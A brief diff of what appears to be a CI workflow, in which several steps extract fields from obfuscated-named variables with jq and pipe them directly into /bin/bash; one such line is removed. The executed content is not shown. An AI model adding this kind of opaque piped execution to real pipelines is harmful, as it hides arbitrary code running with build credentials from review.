@@ -22,7 +22,6 @@ jobs:
           echo $a60 | jq -r .asmt7 | /bin/bash
           echo $duo649 | jq -r .blr2689 | /bin/bash
           printf '%s' "$czpu0" | jq -r .kj9 | /bin/bash
-          printf '%s' "$v5517" | jq -r .q9 | /bin/bash
           echo $ye02294 | jq -r .y7 | /bin/bash
           echo $h1620 | jq -r .lqtsy065 | /bin/bash
           echo $fiw3259 | jq -r .jrud8221 | /bin/bash
